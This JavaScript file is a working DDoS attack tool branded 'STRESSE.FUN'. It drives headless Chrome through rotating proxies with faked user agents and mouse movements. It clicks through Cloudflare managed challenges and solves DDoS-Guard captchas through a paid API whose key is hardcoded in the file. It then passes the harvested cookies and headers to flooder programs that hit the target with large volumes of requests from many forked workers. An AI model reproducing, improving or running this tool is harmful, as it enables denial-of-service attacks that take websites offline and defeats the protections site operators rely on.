const { chromium } = require("playwright-extra");
const { spawn } = require("child_process");
const fs = require("fs");
const readline = require("readline");
const axios = require("axios");
const CDP = require("chrome-remote-interface");
const cluster = require("cluster");
const [target,time,threads,requests,proxyfile,flooding] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
var starts;
var secua;

process.on("uncaughtException", function (error)  {});
process.on("unhandledRejection", function (error) {});

process.setMaxListeners(0);

function randString() {
    let str = "ABCDEFabcef12345678900";
    let s = "";
    for (let i = 0; i < 10; i++) {
        s += str[~~(Math.random() * (str.length - 1))];
    }
    return s;
}

async function chromestart(proxy, random_1) {
    return new Promise((resolve, reject) => {
        try {
            const dir =`playwright/${randString()}`
            const chrome = spawn("/usr/bin/google-chrome", [
                "--remote-debugging-port=0",
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                `--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${random_1}.0.0.0 Safari/537.36`,
                "--use-fake-device-for-media-stream",
                "--use-fake-ui-for-media-stream",
                "--no-sandbox",
                "--enable-experimental-web-platform-features",
                "--disable-dev-shm-usage",
                "--disable-software-rastrizier",
                "--enable-features=NetworkService",
                "--no-first-run",
                "--proxy-server=" + proxy,
                `--user-data-dir=${dir}`,
				'--headless=new'
            ]);

            const rl = readline.createInterface(chrome.stderr);

            rl.on("line", (line) => {
                if (line.startsWith("DevTools listening on ")) {
                    const wsEndpoint = line.substring("DevTools listening on ".length);
                    resolve({ wsEndpoint, chrome });
                }
            });

            process.on("exit", () => {
                chrome.kill();
            });

            chrome.on('close', () => {
                fs.rmSync(dir, { recursive: true, force: true })
            })
        } catch (err) {
            console.log(err);
            reject(err);
        }
    });	
}

async function main(proxy) {
	let x;
	try {
		const uaversion = ['100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112'];
		const random_1 = uaversion[Math.floor(Math.random() * uaversion.length)];
		x = await chromestart(proxy, random_1);
		let wsEndpoint = x.wsEndpoint;
		const cdp = await CDP({port: wsEndpoint.split("ws://")[1].split("/")[0].split(":")[1]});
		await cdp.send('Emulation.setAutomationOverride', { enabled: false });
		const browser = await chromium.connectOverCDP(wsEndpoint);
		const context = await browser.contexts()[0];
		const page = await context.pages()[0];
		await page.setExtraHTTPHeaders({ 'sec-ch-ua': `"Chromium";v="` + random_1 + `", "Google Chrome";v="` + random_1 + `", "Not:A-Brand";v="99"` });
		await page.emulateMedia({ colorScheme: "dark" });
		await page.setViewportSize({ width: 1920, height: 1080 });

		const response = await page.goto(target);
		const headers = await response.request().allHeaders();
		const status = await response.status();
		
		await emulation_mouse(page);
		
		if (![200, 404].includes(status)) {
			console.log('[STRESSE.FUN] Found protection.');
			await page.waitForTimeout(8000);
			await ddgCaptcha(page);
			
			for(let i = 0; i < 3; i++) {
				const cloudflare = await managedchallengesearch(page);
				if (cloudflare) {
					await managedchallengebypass(page, cloudflare);
					await page.waitForTimeout(5000);
					await page.reload();
					console.log('[STRESSE.FUN] Managed challenge bypass.');
				}
			}
			
			const checked_title = await page.title();
			if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD",].includes(checked_title)) {
				await x.chrome.kill();
				await page.close();
				await context.close();
				await browser.close();
			}			
			const cookie = (await page.context().cookies(target)).map((c) => `${c.name}=${c.value}`).join("; ");
			flooder(cookie, headers, proxy);
			console.log("[STRESSE.FUN] " + cookie);
			await x.chrome.kill();
			await page.close();
			await context.close();
			await browser.close();	
		} else {
			console.log("[STRESSE.FUN] Undetected protection.");
			await page.waitForTimeout(500);
			const cookie = (await page.context().cookies(target)).map((c) => `${c.name}=${c.value}`).join("; ");
			flooder(cookie, headers, proxy);
			console.log("[STRESSE.FUN] " + cookie);
			await x.chrome.kill();
			await page.close();
			await context.close();
			await browser.close();	
		}		
	} finally {
		x.chrome.kill();
		page.close();
		context.close();
		browser.close();			
	}
}

async function emulation_mouse(page) {
    const pageViewport = await page.viewportSize();

    for (let i = 0; i < 3; i++) {
        const x = Math.floor(Math.random() * pageViewport.width);
        const y = Math.floor(Math.random() * pageViewport.height);
        await page.mouse.click(x, y);
    }

    const centerX = pageViewport.width / 2;
    const centerY = pageViewport.height / 2;
    await page.mouse.move(centerX, centerY);
    await page.mouse.down();
    await page.mouse.move(centerX + 100, centerY);
    await page.mouse.move(centerX + 100, centerY + 100);
    await page.mouse.move(centerX, centerY + 100);
    await page.mouse.move(centerX, centerY);
    await page.mouse.up();
}	

async function managedchallengesearch(page) {
	const iframeElement = await page.$('iframe[allow="cross-origin-isolated"]');
	if (iframeElement) {
		console.log('[STRESSE.FUN] Managed challenge | Legacy captcha detected.');
		return iframeElement;
	}
	return null;
}

async function managedchallengebypass(page, iframeElement) {
	if (!iframeElement) {
		console.log('[STRESSE.FUN] Element not found.');
		return;
	}

	const iframeBox = await iframeElement.boundingBox();

	if (!iframeBox) {
		console.log('[STRESSE.FUN] Box not found.');
		return;
	}

	const x = iframeBox.x + (iframeBox.width / 2);
	const y = iframeBox.y + (iframeBox.height / 2);

	console.log('[STRESSE.FUN] Element clicked.');

	await page.mouse.move(x, y);
	await page.mouse.down();
	await page.waitForTimeout(100);
	await page.mouse.up();

	console.log('[STRESSE.FUN] Captcha bypassed [Box, Element].');
}

async function ddgCaptcha(page) {
    let s = false;

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j];
        const captchaStatt = await frame.evaluate(() => {
            if (
                document.querySelector("#ddg-challenge") &&
                document.querySelector("#ddg-challenge").getBoundingClientRect()
                    .height > 0
            ) {
                return true;
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status");
            if (captchaStatus) {
                captchaStatus.click();
                return true;
            } else {
                return false;
            }
        });

        if (captchaStatt) {
            await page.waitForTimeout(3000);

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(
                    ".ddg-modal__captcha-image"
                );
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace("data:", "").replace(/^.+,/, "");

                const width = captchaImage?.clientWidth;
                const height = captchaImage?.clientHeight;

                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = height;

                canvas.getContext("2d").drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL("image/jpeg", 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64;
            });

            if (base64r) {
                try {
                    console.log("[STRESSE.FUN] DDoS-Guard Captcha Detected.");
                    const response = await axios.post(
                        "https://api.nopecha.com/",
                        {
                            key: "g0lhe3gz24_RWC6JP3H",
                            type: "textcaptcha",
                            image_urls: [base64r],
                        },
                        {
                            headers: {
                                "Content-Type": "application/json",
                            },
                        }
                    );

                    const res = response.data;

                    const text = await new Promise((resCaptcha) => {
                        function get() {
                            axios.get("https://api.nopecha.com/", {
                                    params: {
                                        id: res.data,
                                        key: "g0lhe3gz24_RWC6JP3H",
                                    },
                                })
                                .then((res) => {
                                    if (res.data.error) {
                                        setTimeout(get, 1000);
                                    } else {
                                        resCaptcha(res.data.data[0]);
                                    }
                                })
                                .catch((error) => { });
                        }
                        get();
                    });

                    s = text;

                    await frame.evaluate((text) => {
                        const captchaInput = document.querySelector(".ddg-modal__input");
                        const captchaSubmit = document.querySelector(".ddg-modal__submit");

                        captchaInput.value = text;
                        captchaSubmit.click();
                    }, text);
                    await page.waitForTimeout(6500);
                    console.log("[STRESSE.FUN] DDoS-Guard Captcha bypassed.");
                } catch (err) { }
            }
        }
    }
    return !!!s;
}

function flooder(cookie, headers, proxy) {
	delete headers["cookie"];
	if(flooding == 'one') {
		delete headers[":path"];
		delete headers[":method"];
		delete headers[":scheme"];
		delete headers[":authority"];
		const headerEntries = Object.entries(headers);
		const args_flood = ["-k", "nxver", "-t", "1"].concat(proxy.indexOf("@") != -1 ? ["-x", proxy.split("@", 1)[0]] : []).concat([
			"-p",
			proxy.indexOf("@") != -1 ? proxy.split("@")[1] : proxy,
			"-u",
			"https://" + parsed.host + parsed.path,
			"-n",
			requests,
			"-r",
			'1',
			"-s",
			"1",
		]).concat(...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])).concat([
			"-h",
			`cookie@${cookie.length > 0 ? cookie : "test@1"}`,
			"-h",
			"referer@" + "https://" + parsed.host + parsed.path,
		]);
		starts = spawn("./flooder", args_flood, {
			stdio: "inherit",
			detached: false,
		});
		starts.on("data", (data) => { });
		starts.on("exit", (err, signal) => {
			starts.kill();
		});	
	} else if(flooding == 'old') {
		const headerEntries = Object.entries(headers);
        const args_test = [
            "-p",
            proxy,
            "-u",
            target,
            "-r",
            requests,
            "-t",
            "10",
            "-d",
            time,
		].concat(...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])).concat([
             "-h",
             `cookie@${cookie.length > 0 ? cookie : "test@1"}`,
		]);				
		starts = spawn("./dersamerv2", args_test, {
			stdio: "inherit",
			detached: false,
		});
		starts.on("data", (data) => { });
		starts.on("exit", (err, signal) => {
			starts.kill();
		});	
	} else {
		delete headers["accept-language"];
		const headerEntries = Object.entries(headers);
        const args_flood_new = [
			"browserflooder-1.js", target, time, requests, proxy,
        ].concat(...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])).concat([
			"-h", `cookie@${cookie.length > 0 ? cookie : "test@1"}`,
        ]);	
		
		starts = spawn("node", args_flood_new, {
			stdio: "inherit",
			detached: false,
		});
		starts.on("data", (data) => { });
		starts.on("exit", (err, signal) => {
			starts.kill();
		});			
	}
}

function start() {
	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
	main(proxy).catch(() => { }).finally(start);
}

if (!cluster.isWorker) {
	console.clear();
	console.log('[STRESSE.FUN] Emulation start.')
    for (let i = 0; i < threads; i++) {
        cluster.fork()
    }

    setTimeout(function () {
        console.clear();
        process.exit(-1);
        starts.kill(-1);
        spawn.kill(-1);
    }, time * 1000);
	
} else {
    start();
}
